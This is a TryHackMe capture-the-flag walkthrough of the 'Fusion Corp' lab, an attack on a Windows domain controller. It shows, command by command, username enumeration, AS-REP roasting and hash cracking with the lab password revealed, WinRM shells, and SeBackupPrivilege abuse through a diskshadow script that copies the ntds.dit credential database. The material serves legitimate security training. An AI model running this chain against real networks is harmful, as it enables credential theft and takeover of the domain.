<h1 align="center">Fusion Corp</h1>
<p align="center">2025, August 9<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>460</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Fusion Corp said they got everything patched... did they</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/27f4ecf0-b768-4d37-9327-0b1d5c0a6b5f"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/fusioncorp">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b7cf893f-e0ad-4b8e-9f53-46b54516f860"></p>


<br>

<h2>Task 1 . Fusion Corp</h2>
<p>You had an engagement a while ago for Fusion Corp. They contacted you saying they've patched everything reported and you can start retesting.</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>Nmap</h3>
<p>
  
- <code>fusion.corp</code></p>

```bash
:~/FusionCorp# nmap -sC -sV -n -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-xx-xx xx:xx:xxZ)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-xx-xx...
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2025-xx-xxTxx:xx:xx
|_Not valid after:  2025-xx-xxTxx:xx:xx
|_ssl-date: 2025-xx-xxTxx:xx:xx+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FUSION-DC, NetBIOS user: <unknown>, NetBIOS MAC: 0...(unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-xx-xx...
|_  start_date: N/A
```

<br>

<h3>ldapsearch</h3>

```bash
:~/FusionCorp# ldapsearch -x -h fusion.corp -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=fusion,DC=corp
namingcontexts: CN=Configuration,DC=fusion,DC=corp
namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp
namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp
namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1                                
```

<h3>/etc/hosts</h3>

```bash
TargetIP  fusion.corp
...
                                  
```

<h3>dirsearch</h3>

<p>

- <code>/backup</code><br>
- <code>/css</code><br>
- <code>/js</code><br>
- <code>/lib</code></p>

```bash
:~/FusionCorp# dirsearch -u http://fusion.corp/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt                                 
```

<img width="1156" height="319" alt="image" src="https://github.com/user-attachments/assets/18751719-52c9-4a5c-918a-6bfa790835af" />


<br>

<h3>Web 80</h3>h3>

<img width="1128" height="557" alt="image" src="https://github.com/user-attachments/assets/9eb3903a-b03f-4de9-b829-08b77d6b847f" />

<img width="1125" height="538" alt="image" src="https://github.com/user-attachments/assets/ff312efd-823d-4fca-95ef-d5d304725ef1" />

<img width="1123" height="470" alt="image" src="https://github.com/user-attachments/assets/3da64457-b9ef-4cbe-9d9a-013cb839bde7" />

<br>

<h3>/backup</h3>

<img width="1125" height="143" alt="image" src="https://github.com/user-attachments/assets/b82d7a97-d2fe-4946-887e-bc586a8b423c" />

<br>

<h3>employees.ods</h3>
<p>

- opened <code>employeed.ods</code> with <code>LibreOffice</code></p>

<img width="1165" height="381" alt="image" src="https://github.com/user-attachments/assets/fc28395a-be30-4846-8e54-edde558e6550" />

<br>

<h3>names.txt</h3>

```bash
Jhon Mickel
Andrew Arnold
Lellien Linda
Jhon Powel
Dominique Vroslav
Thomas Jeffersonn
Nola Maurin
Mira Ladovic
Larry Parker
Kay Garland
Diana Pertersen
```

<br>

<h3>usernames.txt</h3>

```bash
jmickel
aarnold
llinda
jpowel
dvroslav
tjefferson
nmaurin
mladovic
lparker
kgarland
dpertersen
```

<br>

<h3>kerbrute</h3>
<p>

- <code>lparker@fusion.corp</code></p>

```bash
:~/FusionCorp# kerbrute userenum --dc TargetIP -d fusion.corp usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/09/25 - Ronnie Flathers @ropnop

2025/08/09 xx:xx:xx >  Using KDC(s):
2025/08/09 xx:xx:xx >  	TargetIP

2025/08/09 xx:xx:xx >  [+] VALID USERNAME:	 lparker@fusion.corp
2025/08/09 xx:xx:xx >  Done! Tested 11 usernames (1 valid) in 0.157 seconds
```

<br>
<h3>GetNPUsers</h3>

```bash
:~/FusionCorp# python3 /usr/local/bin/GetNPUsers.py fusion.corp/lparker -dc-ip TargetIP -no-pass
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Getting TGT for lparker
$krb5asrep$23$lparker@FUSION.CORP:3c81999a4b32357********************2e973b8149cbe2bacbf80991412a98f60a49739acc9115e999c43e62f25c6f1e6cc616d28e5acec460aa2a63de1d6bd8ca0d86f07b71a7075411cc854e81c3608c60a96b6e3988745222464a504c7a7707d76bb47bb081f11d6a0c5da352aa2a92b1346a73f86d44111a4ed7f575c8fc54c7d744f63416fb64aed6508da51b70db6c26b773f3a12b25e3713b551e9e0e59b6ae7bc82a3c2ad95357b00c40072d4dabf502fd902361cf9a6e3a25c09424773defd9c458476ac0d26c94be600f14a3641f0a049cf269a8ab388ba927bd88c1019d9d63071c0e468f55d5749564d59ccce1b363d1c8c131
```

<br>
<h3>John the Ripper</h3>
<p>

- <code>lparker</code> : <code>!!abbylvzsvs2k6!</code>
</p>

```bash
:~/FusionCorp# john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
**************** ($krb5asrep$23$lparker@FUSION.CORP)
...
Session completed. 
```

<br>

<h3>ldapdomaindump</h3>

```bash
:~/FusionCorp# ldapdomaindump TargetIP -u 'fusion.corp\lparker' -p '****************' --no-json --no-grep
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

```bash
:~/FusionCorp# ls
domain_computers_by_os.html  domain_groups.html  domain_trusts.html          domain_users.html
domain_computers.html        domain_policy.html  domain_users_by_group.html
```

<br>

<p><code>domain_computer.html</code></p>

<img width="1185" height="193" alt="image" src="https://github.com/user-attachments/assets/dbb0cd9b-30e4-4c8e-95cf-f06b562234fe" />

<p><code>domain_users.html</code></p>

<img width="1661" height="425" alt="image" src="https://github.com/user-attachments/assets/35f35f7c-ade6-478b-8311-5b1d1faf9d55" />

<p><code>domain_users_by_group.html</code></p>

<img width="1659" height="308" alt="image" src="https://github.com/user-attachments/assets/31eab71a-c379-472e-a162-1d40a3e0dc71" />

<img width="1653" height="601" alt="image" src="https://github.com/user-attachments/assets/533a9766-f97d-4fb1-83aa-c928a93b34e3" />



<br>
<h3>evil-winrm</h3>

```bash
:~/FusionCorp# evil-winrm -u lparker -p '****************' -i TargetIP
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\lparker\Documents> 
```

<img width="1157" height="499" alt="image" src="https://github.com/user-attachments/assets/b3205633-8b44-4426-b97b-b3d819b74173" />

<br>


```bash
*Evil-WinRM* PS C:\Users\lparker\Desktop> dir


    Directory: C:\Users\lparker\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\lparker\Desktop> type flag.txt
THM{**************b89432fada8218f4ef}
```

<br>

```bash
*Evil-WinRM* PS C:\Users\lparker\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

<br>

<p>1.1. User 1<br>
<code>THM{**************b89432fada8218f4ef}</code></p>

<br>

<h3>l</h3>

```bash
ldapdomaindump $IP -u 'fusion.corp\lparker' -p '****************' --no-json --no-grep
```


<br>

<h3>Users</h3>

```bash
*Evil-WinRM* PS C:\Users\lparker\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    jmurphy
krbtgt                   lparker
```

<br>

```bash
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2021   3:49 AM                Administrator
d-----         3/3/2021   5:54 AM                jmurphy
d-----         3/3/2021   5:54 AM                lparker
d-r---         3/3/2021   3:49 AM                Public
```

<br>

<h3> User <code>jmurphy</code></h3>

<p>

- <code>jmurphy</code>  : <code>****************</code></p>

```bash
:~/FusionCorp# rpcclient -U lparker fusion.corp
```

<img width="977" height="584" alt="image" src="https://github.com/user-attachments/assets/dbedbc8b-2349-43e4-a81c-ceff4f85a2e6" />

<br>

```bash
:~/FusionCorp# evil-winrm -i fusion.corp -u jmurphy
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> dir


    Directory: C:\Users\jmurphy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\jmurphy\Desktop> type flag.txt
THM{b4aee2db2901514e28************12e
```

<br>

<p>

- <code>jmurphy</code> is a member of <code>BUILTIN\Backup Operators</code><br>
- <code>lparker</code> wasn´t</p>

```bash
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

<br>

<p>1.2. User 2<br>
<code>THM{b4aee2db2901514e28************12e}</code></p>


<br>

<h3>Privileges</h3>

```bash
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

<br>

<h3>/tmp</h3>

```bash
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> cd C:\
```

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2021   3:59 AM                inetpub
d-----         3/7/2021   2:02 AM                PerfLogs
d-r---         3/7/2021   2:52 AM                Program Files
d-----         3/3/2021   3:49 AM                Program Files (x86)
d-----         3/3/2021   6:07 AM                stuff
d-r---         3/3/2021   5:54 AM                Users
d-----         3/7/2021   2:59 AM                Windows
```

```bash
*Evil-WinRM* PS C:\> mkdir c:\tmp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/9/2025  10:00 AM                tmp
```

<br>

<h3>este.txt</h3>


```bash
:~/FusionCorp# cat este.txt
set context persistent nowriters #
set metadata c:\tmp\metadata.cab #
add volume c: alias myAlias #
create #
expose %myAlias% x: #
exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit #
delete shadows volume %myAlias% #
reset #
```

```bash
*Evil-WinRM* PS C:\tmp> upload este.txt
```

```bash
*Evil-WinRM* PS C:\tmp> diskshadow /s este.txt
```

<img width="1729" height="750" alt="image" src="https://github.com/user-attachments/assets/2424621b-61e2-4315-863a-de5b5c814e7a" />


<br>

<h3><code>SeBackupPrivilegeUtils.dll</code>, <code>SeBackupPrivilegeCmdLets.dll</code></h3>

<p>

- https://github.com/giuliano108/SeBackupPrivilege/ <br> <img width="1853" height="858" alt="image" src="https://github.com/user-attachments/assets/00623c02-88cf-4c27-9c13-d9f23c4dced9" />
</p>

<br>

```bash
:~/FusionCorp# wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

<br>

```bash
:~/FusionCorp# wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

<br>


```bash
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /root/FusionCorp/SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!
```

<br>

```bash
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /root/FusionCorp/SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\tmp> 
```

<br>

```bash
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeUtils.dll
```

<br>
<br>

<h3>Copy-FileSeBackupPrivilege</h3>


```bash
*Evil-WinRM* PS C:\tmp> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\flag.txt C:\Users\jmurphy\Documents\flag.txt
```

<br>

```bash
*Evil-WinRM* PS C:\tmp> cat C:\Users\jmurphy\Documents\flag.txt
THM{f72988e***********f2115e10464d15}
```


<br>

<p>1.3. User 3<br>
<code>THM{f72988e***********f2115e10464d15}</code></p>


<br>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c62786a6-f050-4cec-a18d-efe00ad5dbbb"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/77722b20-9401-4fb4-bd84-cde4acb33897"></p>


<br>


<img width="1900" height="892" alt="image" src="https://github.com/user-attachments/assets/6f4d40fb-e9a3-4669-906f-a42321863192" />


<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 9    |   460    |     131ˢᵗ    |      5ᵗʰ     |     450ᵗʰ   |    12ⁿᵈ    | 119,946  |    906    |    73     |


</div>


<p align="center">Global All Time:   131ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/71fa8e2a-c76d-40b2-8954-e6b8fec870ed"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/bea04913-2594-488b-8200-f8933bbf1dd2"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6dc1df7d-67d7-4c35-be9f-eb4bd75a22d5"><br>
                  Global monthly:    450ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6f4d40fb-e9a3-4669-906f-a42321863192"><br>
                  Brazil monthly:      12ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/36bbdb78-c4fe-4021-885b-5391062516df"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 



